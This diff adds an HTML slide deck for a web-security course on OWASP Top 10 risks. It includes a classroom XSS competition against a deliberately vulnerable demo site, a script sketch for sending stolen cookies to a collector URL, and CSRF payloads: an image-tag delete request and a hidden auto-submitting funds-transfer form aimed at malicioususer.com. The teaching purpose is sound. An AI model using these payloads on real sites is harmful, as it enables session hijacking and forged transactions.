@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title></title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <!--<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.3.0-beta.13/angular.min.js"></script>-->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+  <link rel="stylesheet" media="all" href="../theme/css/default.css">
+  <link rel="stylesheet" media="only screen and (max-device-width: 480px)" href="../theme/css/phone.css">
+
+  <script src="http://code.jquery.com/jquery-1.12.2.min.js"></script>
+  <script src="../js/jquery-1.11.1.min.js"></script>
+  <script src="../js/presenter.js"></script>
+
+  <base target="_blank">
+  <style>
+    code {
+      color: darkblue;
+    }
+  </style>
+
+  <!-- This opens all links in a new tab. -->
+  <script data-main="../js/slides" src="../js/require-1.0.8.min.js"></script>
+
+  <!--In order to have more than one slideset in the project-->
+  <script src="slides.js"></script>
+
+</head>
+
+<!--Setup Angular for the full slide-set-->
+<!--<body ng-app="SlideApp" style="opacity: 0">-->
+
+<body style="opacity: 0">
+
+  <slides class="layout-widescreen">
+
+    <slide class="title-slide segue nobackground" style="background: #00163B">
+      <aside class="gdbar">
+        <img src="../images/logo.png" style="width: 200px;">
+      </aside>
+      <hgroup class="auto-fadein" style="color: white;">
+        <div style="float: left;">
+          <h1 data-config-title></h1>
+
+          <h2 data-config-subtitle></h2>
+
+          <p data-config-presenter></p>
+        </div>
+        <div style="float:left;margin-left: 2em;">
+          <img src="images/security.png" style="float:left">
+        </div>
+      </hgroup>
+    </slide>
+
+    <slide>
+      <hgroup>
+        <h2>Security </h2>
+        <h3>That's easy - anyone can do it right, yeah????</h3>
+      </hgroup>
+      <article class="build">
+        <div class="row">
+          <div class="col-md-8">
+            <p style="clear: both;font-style: italic;color: #2a6496">"There are only two types of companies: those that have been hacked and those that will be.
+              <br/> And even they are converging into one category: companies that have been hacked and will be hacked again."
+            </p>
+            <p>A popular rephrase ;-)</p>
+            <p style="font-style: italic;color: #2a6496">
+              There are two types of companies: those who have been hacked, and those who don’t yet know they have been hacked
+            </p>
+          </div>
+          <div class="col-md-4">
+            <div class="row">
+              <div class="col-md-5" />
+              <img style="float: left;margin-right: 15px;" src="../Security2/images/fbiDirector.jpg">
+            </div>
+            <div class="col-md-7" />
+            <p style="font-size: 0.6em;">Robert S. Mueller, III
+              <br/> Director
+              <br/> Federal Bureau of Investigation
+              <br/> RSA Cyber Security Conference
+              <br/> San Francisco, CA
+              <br/> March 01, 2012
+              <br/>
+              <span style="font-size: 0.5em; color:darkblue">
+                <a href="https://archives.fbi.gov/archives/news/speeches/combating-threats-in-the-cyber-world-outsmarting-terrorists-hackers-and-spies">
+                  Ref.</a>
+              </span>
+            </p>
+          </div>
+        </div>
+        </div>
+        </div>
+      </article>
+    </slide>
+
+    <slide>
+      <hgroup>
+        <h2>Before we start - Hacking is Illegal</h2>
+        <h3>In all forms</h3>
+      </hgroup>
+      <article>
+        <div>
+          You migth feel, that if anyone would leave a server vulnerable to attacks like those we are going to investigate, they "had
+          it coming".
+        </div>
+
+        <div class="row" style="margin-top: 1em;">
+          <div class="col-md-6">
+            <br/>
+            <br/> BUT you can
+            <b>literally go to jail</b> for trying something like this, without the (very clear) acceptance from the owner of
+            a site
+          </div>
+          <div class="col-md-6">
+            <img style="width: 60%;margin: 1em;" src="images/jail.jpg" />
+          </div>
+
+        </div>
+      </article>
+    </slide>
+
+    <slide>
+      <hgroup>
+        <h2>Topics for this week (two days)</h2>
+      </hgroup>
+      <article>
+        <div>
+          <p>An introduction to the OWASP top 10-2017 threads:</p>
+          <ul style="font-size:45px;margin-left:2em;margin-top:1em;">
+            <li>
+              <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">A2</a> - Broken Authentication</li>
+            <li>
+              <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">A5</a> - Broken Access Control</li>
+            <li>
+              <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">A7</a> - Cross-Site Scripting (XSS)</li>
+          </ul>
+        </div>
+      </article>
+    </slide>
+    <slide>
+      <hgroup>
+        <h2>What Are Application Security Risks</h2>
+        <h3>A quick recap - relationship between threat agent and business impact</h3>
+      </hgroup>
+      <article>
+        <div>
+          <img style="float: left;margin-right: 15px;width:100%" src="images/1200px-Risks-2017.png">
+          <p>
+            A threat agent, through an attack vector, exploits a weakness (vulnerability) of the system and the related security controls,
+            causing a technical impact on an IT resource (asset) connected to a business impact
+          </p>
+        </div>
+      </article>
+    </slide>
+    <slide>
+      <hgroup>
+        <h2>OWASP Risk Calculation</h2>
+      </hgroup>
+      <article>
+        <div style="margin-top: -35px">
+          <p>For each Top 10 category the typical risk is estimated that each weakness introduces to a typical web application
+            by looking at common likelihood factors and impact factors for each common weakness</p>
+          <img style="margin-left: 45px;width:80%" src="images/risk1.PNG">
+          <p>Impact is environment and business specific</p>
+          <p> Each business must consider its own specific threat agents and business impacts.</br>
+            Even severe software weaknesses may not present a serious risk if there are no threat agents in a position to perform the
+            necessary attack or the business impact is negligible for the assets involved.</p>
+        </div>
+      </article>
+    </slide>
+    <slide>
+      <hgroup>
+        <h2>Top 10 Risk Factor Summary</h2>
+      </hgroup>
+      <article>
+        <div>
+          <img style="margin-left: 45px;width:80%;margin-bottom: 15px;" src="images/risk10.PNG">
+          <p> OWASP (2017) Security Risk's ordered to those weaknesses that typically introduce the most significant risk to
+            an application. </br>These factors get updated with each new Top 10 release as things change and evolve</p>
+        </div>
+      </article>
+    </slide>
+    <slide>
+      <hgroup>
+        <h2>Broken Authentication A2</h2>
+        <h3>Discussion</h3>
+      </hgroup>
+      <article>
+        <div style="font-size: 2em;text-align: center">
+          <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">A2</a>
+          </br>
+          </br>
+          <p>Broken Authentication</p>
+        </div>
+      </article>
+    </slide>
+    <slide>
+      <hgroup>
+        <h2> Broken Access Control A5</h2>
+        <h3>Discussion</h3>
+      </hgroup>
+      <article>
+        <div style="font-size: 2em;text-align: center">
+          <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">A5</a>
+          </br>
+          </br>
+          <p> Broken Access Control</p>
+        </div>
+      </article>
+    </slide>
+    <slide>
+      <hgroup>
+        <h2> Cross-Site Scripting (XSS) A7</h2>
+        <h3>Discussion</h3>
+      </hgroup>
+      <article>
+        <div style="font-size: 2em;text-align: center">
+          <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">A7</a>
+          </br>
+          </br>
+          <p> Cross-Site Scripting (XSS)</p>
+        </div>
+      </article>
+    </slide>
+    <slide>
+      <hgroup>
+        <h2>Cross-Site Scripting (XSS)</h2>
+      </hgroup>
+      <article>
+        <p>Acording to OWASP, there are three forms of XSS, usually targeting user's browsers</p>
+        <ul>
+          </li>
+          <b>Reflected XSS:</b>
+          <p>The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack
+            can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will
+            need to interact with some malicious link that points to an attacker-controlled page</p>
+          </li>
+          <li>
+            <b>Stored XSS:</b>
+            <p>The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator.
+              Stored XSS is often considered a high or critical risk</p>
+          </li>
+          <li><b>DOM XSS:</b><p>JavaScript frameworks, single-page applications, and APIs that dynamically 
+            include attacker-controllable data to a page are vulnerable to DOM XSS.</p></li>
+        </ul>
+        <p>We will try all three forms in today's demo's</p>
+      </article>
+    </slide>
+    
+    <slide>
+      <hgroup>
+        <h2>The Simple Site We are going to Hack</h2>
+      </hgroup>
+      <article>
+
+        <div class="row" style="margin-top: 1em;">
+          <div class="col-md-5">
+            <br/>
+            <br/>
+            <br/>
+            <ul>
+              <li>Users will "login" by providing their name and a secret to simulate users personal data (yellow)</li>
+              <li>All "logged in" users will se a page with their name + secret (yellow) and a list of all other users (green)
+              </li>
+            </ul>
+          </div>
+
+          <div class="col-md-7">
+            <img style="width: 100%;" src="images/aboutSiteToHack.PNG" />
+          </div>
+
+        </div>
+      </article>
+    </slide>
+
+    <slide>
+      <hgroup>
+        <h2>Hacker Architecture for this Demo/exercise/competition</h2>
+      </hgroup>
+      <article>
+
+        <div class="row" style="margin-top: 1em;">
+
+          <div class="col-md-7">
+            <img style="width: 100%;" src="images/HackerArchitecture.PNG" />
+          </div>
+
+          <div class="col-md-5">
+            <br/>
+            <ol style="color: darkred; font-size: 0.9em;">
+              <li>The hacker will "login" with a user name + "
+                <em>something more</em>"</li>
+              <br/>
+              <li>Depending on the "
+                <em>something more</em>" above and the "stupidity" of the designer, the hacker will steal the session id's belonging
+                to other users
+              </li>
+              <br/>
+              <li>If 2 was a "success" the hacker will enter the site (using the stolen session id's), and steal other users
+                secrets
+              </li>
+            </ol>
+          </div>
+        </div>
+      </article>
+    </slide>
+
+
+    <script>
+      $(function () {
+        var url = location.protocol + "//" + location.host;
+        $("#url0").text(url + "/session2").attr("href", url + "/session2");
+        $("#url1").text(url + "/session2").attr("href", url + "/session2");
+        $("#url2").text(url + "/hackerEntry/?cookie=A message (perhaps a cookie value)");
+        $("#url3").text(url + "/hackerEntry?cookie=xx");
+      })
+    </script>
+
+
+    <slide>
+      <hgroup>
+        <h2>Sessions, Session Hijacking and XSS</h2>
+      </hgroup>
+      <article>
+        <div class="row" style="margin-top: 1em;">
+          <p>Before we start, lets recap on the topics:</p>
+          <ul>
+            <li>Sessions (one more time)</li>
+            <li>Session Hijacking</li>
+            <li>XSS (Cross Site Scripting)</li>
+          </ul>
+          <p> Login to this site:
+            <a id="url0" href=""></a>
+          </p>
+          <p style="color: darkred">PLEASE don't do anything else than what your are asked to (you will get your chance)
+          </p>
+        </div>
+      </article>
+    </slide>
+
+
+    <slide>
+      <hgroup>
+        <h2>Basic (Web) Security Threads</h2>
+        <h3>Cross Site Scripting (XSS) Discussion</h3>
+      </hgroup>
+      <article style="margin-top: 10px;">
+        <div class="row">
+
+          <div class="col-md-6" style="font-size: 0.8em;">
+            <p>This site is an
+              <b>extremely silly</b> implementation of a session based system. It:</p>
+            <ul>
+              <li>Writes back user input (user name) to all users without sanitization</li>
+              <li>It uses session cookies with the property httpOnly = false</li>
+            </ul>
+            <h2>Competition</h2>
+            <img style="width:35%; margin-top: -0px;" src="images/competition.jpg">
+            <ul>
+              <li>First one to crack a sessionID:
+                <b>2 small beers</b>
+              </li>
+              <li>First one to discover a secret:
+                <b>One Large BEER :-)</b>
+              </li>
+            </ul>
+          </div>
+          <div class="col-md-6">
+            <div style="font-size: 0.6em;">
+              <p>URL for the embedded (iframe) page below is:
+                <br/>
+                <a id="url1" href=""></a>
+              </p>
+              <p>So if you succeed in stealing a SessionID, use POSTMAN to log on to this site using this SessionID </p>
+            </div>
+            <iframe src="/session2" style=height:400px;width:100%;float:left;background-color:#e6e6e6; "></iframe>
+        </div>
+      </div>
+    </article>
+  </slide>
+  <script>
+
+    var myVar = null;
+    $(document).ready(function () {
+      $("#span ").hide();
+    })
+    function listen() {
+      if (myVar === null) {
+        myVar = setInterval(dataFetcher, 5000);
+        $("#span ").show();
+      }
+    }
+
+    function stopListen() {
+      clearInterval(myVar);
+      myVar = null;
+      $("#span ").hide();
+    }
+
+    function dataFetcher() {
+      $.get("/hackerInfo ", function (data) {
+        var d = " ";
+        data.forEach(function (hackerItem) {
+          d += hackerItem + "<br/>";
+        }); $("#hackerData").html(d);
+      });
+    }
+
+
+  </script>
+            <slide>
+              <hgroup>
+                <h2>Hackers Help Page</h2>
+              </hgroup>
+
+              <article style="margin-top: 25px;">
+                <div class="row">
+                  <div class="col-md-7" style="font-size: 0.7em;">
+                    <button class="btn btn-primary" id="btnStart" onclick="listen()">Listen</button>
+                    <button id="btnEnd" class="btn btn-danger" onclick="stopListen()">Stop</button>
+                    <span id="span" style="color: #3c763d">&nbsp;Listening</span>
+                    <p>My server provides you with a little help for your hacking attempts. You can very easily send a message
+                      via this URL:</p>
+                    <p id="url2" style="color: darkblue"></p>
+                    <p>You can monitor all messages being sent to this page by pressing "listen"
+                      <b>TRY</b>
+                    </p>
+                    <p>You can send a HTTP request using plain JavaScript as sketched below:</p>
+                    <pre class="prettyprint pre14">
+&lt;script&gt;
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open(&quot;GET&quot;,"<span id="url3"></span>+");
+xmlHttp.send();
+&lt;/script&gt;</pre>
+                    <p>If the backend developers has been stupid enough you can read (session) cookies like:</p>
+                    <pre class="prettyprint pre14">
+console.log(document.cookie); </pre>
+
+                  </div>
+                  <div class="col-md-5" id="hackerData" style="height:400px;overflow-y: auto;font-size: 0.6em;"></div>
+                </div>
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>Bacic Security Threads</h2>
+                <h3>XSS - Discussion</h3>
+
+              </hgroup>
+              <article>
+                <div style="margin: 1.2em; font-size: 1.6em;">
+                  <ul>
+                    <li>What is XSS</li>
+                    <li>How Do we Avoid it</li>
+                    <li>Angular and XSS ??? (use Google)</li>
+                    <li>
+                      <ul>
+                        <li>React and XSS ??? (use Google)</li>
+                      </ul>
+                      <ul>
+                        <li>
+                          <a href="https://facebook.github.io/react/docs/dom-elements.html#dangerouslysetinnerhtml">dangerouslySetInnerHTML</a>
+                        </li>
+                      </ul>
+                    </li>
+
+                  </ul>
+                </div>
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>Basic Security Threads</h2>
+                <h3>Cross-Site Request Forgery (CSRF) </h3>
+              </hgroup>
+              <article style="font-size: .9em;">
+                <p style="margin-top: -25px;">
+                  Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in
+                  which they're currently authenticated.
+                  <br/> CSRF rely on the fact that browsers automatically add cookies to HTTP requests if it has cookies associated
+                  with the target domain and path. That includes session cookies.
+                </p>
+
+                <p>
+                  <b>CSRF</b> attacks specifically target
+                  <em>state-changing requests</em>, not theft of data (such as move 1000$ from you account into hacker.com's
+                  account), since the attacker has no way to see the response to the forged request.</p>
+                <div class="row">
+                  <div class="col-md-7">
+                    <p>With a little help of social engineering (Phishing), such as sending a link via email or chat, an attacker
+                      may trick the users of a web application into executing actions of the attacker's choosing. If the
+                      victim is a normal user, a successful CSRF attack can force the user to perform state changing requests
+                      like transferring funds, changing their email address, and so forth. If the victim is an administrative
+                      account, CSRF can compromise the entire web application.
+                    </p>
+                  </div>
+                  <div class="col-md-5">
+                    <img src="images/csrf.png" style="width: 100%" />
+                  </div>
+                </div>
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>CSRF Example</h2>
+              </hgroup>
+              <article>
+                <div style="font-size: 0.85em">
+                  <p style="margin-top: -30px;">
+                    Assume a website
+                    <b>testsite.com</b>, and this site has user accounts. It is given that an admin user is able to delete the
+                    user account for "bob" by visiting the URL
+                    <span style="font-style: italic">testsite.com/user.php?delete=bob </span>
+                    If a non-admin user visits this URL, nothing will happen because they don't have admin privileges.</p>
+                  <p>Now assume there is a malicious user with his own website,
+                    <b>malicioususer.com</b>. This malicious user could include code on a page of his site like this:
+                    <br/>
+                    <code>&lt;img src=&quot;http://testsite.com/user.php?delete=bob&quot;/&gt;</code>
+                  </p>
+                  <p>When the admin of testsite.com visits this page, he won't see anything (http://testsite.com/user.php?delete=bob
+                    is not a valid image). However testsite.com still received a request, and if the admin is logged in,
+                    the action will be performed and bob's account will be deleted.
+                  </p>
+                  <img src="images/csrf_flowchart.png" style="margin-left: 6em; width:60%;float:left">
+                  <footer class="source">
+                    <a href="http://halls-of-valhalla.org/beta/articles/cross-site-request-forgery-demystified,47/">ref</a>
+                  </footer>
+                </div>
+              </article>
+            </slide>
+            <slide>
+              <hgroup>
+                <h2>CSRF Example</h2>
+              </hgroup>
+              <article>
+                <div style="font-size: 0.85em">
+                  <p style="margin-top: -30px;">
+                    The previous example was the simplest form of CSRF. Typically the more interesting types of actions on a website will be
+                    performed using POST, so an img tag or hyperlink won't be a possible attack vector in most cases, but
+                    it's still possible to include auto-submitting forms and AJAX requests to perform CSRF.
+                  </p>
+                  <pre class="prettyprint pre16">
+&lt;body&gt;
+  &lt;img href=&quot;testsite.com/banking?transferTo=tom@malicioususer.com&quot; /&gt;
+
+  &lt;!&ndash; or with a hidden form post &ndash;&gt;
+
+  &lt;script type=&quot;text/javascript&quot;&gt;
+  $(document).ready(function() {
+    window.document.forms[0].submit();
+  });
+  &lt;/script&gt;
+
+  &lt;div <b>style=&quot;display:none;&quot;&gt</b>;
+    &lt;form action=&quot;testsite.com/banking&quot; method=&quot;POST&quot;&gt;
+      &lt;input name=&quot;transferTo&quot; value=&quot;tom@malicioususer.com&quot; /&gt;
+    &lt;form&gt;
+  &lt;/div&gt;
+&lt;/body&gt; </pre>
+
+                </div>
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>Preventing CSRF</h2>
+              </hgroup>
+              <article>
+                <p>See this article for a great explanation:
+                  <a href="http://halls-of-valhalla.org/beta/articles/cross-site-request-forgery-demystified,47/">
+                    How Can I Effectively Prevent CSRF?
+                  </a>
+                </p>
+                <p>Client side with Angular:
+                  <a href="https://docs.angularjs.org/api/ng/service/$http#cross-site-request-forgery-xsrf-protection">
+                    Cross Site Request Forgery (XSRF) Protection
+                  </a>
+                </p>
+                <p>Node/Express:
+                  <a href="https://expressjs.com/en/advanced/best-practice-security.html#additional-considerations">
+                    Additional Considerations
+                  </a>
+                </p>
+
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>Basic Security Threads</h2>
+                <h3>SQL Injection Discussion</h3>
+              </hgroup>
+              <article>
+                <div style="margin: 1em; font-size: 2em;">
+                  <ul>
+                    <li>What is SQL Injection (
+                      <a href="https://www.owasp.org/index.php/SQL_Injection">*</a>)</li>
+                    <li>How Do we Avoid it</li>
+                    <li>JPA and SQL Injection (
+                      <a href="http://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-persistence-api-jpa">
+                        *)</a>
+                    </li>
+                  </ul>
+                </div>
+              </article>
+            </slide>
+            <script>
+              $(function () {
+                $("#mongoFrame").hide();
+              })
+              function show() {
+                $("#mongoFrame").toggle();
+              }
+            </script>
+            <slide>
+              <hgroup>
+                <h2>Basic (Web) Security Threads</h2>
+                <h3>"SQL" Injection and MongoDB Discussion</h3>
+              </hgroup>
+              <article style="margin-top: 10px;">
+
+                <div>
+                  <span style="font-size: 1.4em;">Is MongoDB vulnerable to "SQL Injection Like" attacks?</span>
+                  <button class="btn-lg btn-warning" onclick="show()">?</button>
+                </div>
+
+                <iframe id="mongoFrame" data-src="https://duckduckgo.com/?q=mongodb+sql+injection&t=h_&ia=qa" class="scaled_iframe" style="height: 500px;width:100%;"></iframe>
+
+
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>Basic Security Threads</h2>
+                <h3>3rd part dependencies</h3>
+              </hgroup>
+              <article>
+
+                <div class="row" style="margin-top: -30px;">
+                  <a href="http://www.infoworld.com/article/2626167/data-security/third-party-code-putting-companies-at-risk.html">
+                    <img src="images/thirdParty1.PNG" style="width: 60%;box-shadow: 5px 5px 5px #888888;">
+                  </a>
+                  <br>
+                  <br>
+                  <a href="http://betanews.com/2014/10/08/professionals-believe-their-java-apps-are-secure-despite-relying-on-third-party-code/"
+                    style="margin-left:6em; ">
+                    <img src="images/thirdParty2.PNG" style="width: 60%;box-shadow: 5px 5px 5px #888888;">
+                  </a>
+                  <br/>
+                  <br>
+                  <a href="http://techbeacon.com/third-party-libraries-are-one-most-insecure-parts-application" style="margin-left: 12em;">
+                    <img src="images/thirdParty3.PNG" style="width: 50%;box-shadow: 5px 5px 5px #888888;">
+                  </a>
+                  <br>
+                  <br/>
+                  <a href="http://www.waratek.com/two-thirds-of-enterprise-java-applications-contain-mostly-third-party-code-yet-considered-secure/"
+                    style="margin-left: 5em;">
+                    <img src="images/thirdParty4.PNG" style="width: 60%;box-shadow: 5px 5px 5px #888888;">
+                  </a>
+                </div>
+
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>Basic Security Threads</h2>
+                <h3>Discussion &rightarrow; How do you ensure your 3rd part dependencies are secure</h3>
+              </hgroup>
+              <article>
+
+                <ul style="font-size: 1.3em;">
+                  <li>In Java how do we ensure that our 3rd party dependencies are secure? (
+                    <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">*</a>)
+                    </a>
+                  </li>
+                  <br/>
+                  <li>
+                    With Node, Express and the "billion" packages on
+                    <em>npm</em>, how do we ensure they are secure? (
+                    <a href="https://nodesecurity.io/">*</a>)
+                  </li>
+                </ul>
+              </article>
+            </slide>
+
+            <slide>
+              <hgroup>
+                <h2>Basic (Web)Security Threads</h2>
+                <h3>Node/Express - Best Security Practices</h3>
+              </hgroup>
+              <article>
+                <p>If you forget everything we have talked about up until now (you don't ;-) DON't forget this link:</p>
+
+                <br/>
+                <div style="font-size: 1.7em">
+                  <a href="http://expressjs.com/en/advanced/best-practice-security.html">Express, best Practices Security</a>
+                </div>
+              </article>
+            </slide>
+
+
+            <slide class="nobackground" style="background: #00163B">
+              <aside class="gdbar right">
+                <img src="../images/logo.png" style="width: 200px;">
+              </aside>
+              <hgroup>
+
+              </hgroup>
+              <article class="flexbox  auto-fadein" style="margin-top: 25%;">
+
+
+              </article>
+              <p class="auto-fadein" data-config-contact>
+                <!-- populated from slide_config.json -->
+              </p>
+            </slide>
+
+
+            <slide class="backdrop"></slide>
+
+  </slides>
+
+
+  <script>
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-XXXXXXXX-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function () {
+      var ga = document.createElement('script');
+      ga.type = 'text/javascript';
+      ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+  <!--[if IE]>
+<script src="http://ajax.googleapis.com/ajax/libs/chrome-frame/1/CFInstall.min.js"></script>
+<script>CFInstall.check({mode: 'overlay'});</script>
+<![endif]-->
+</body>
+
+</html>
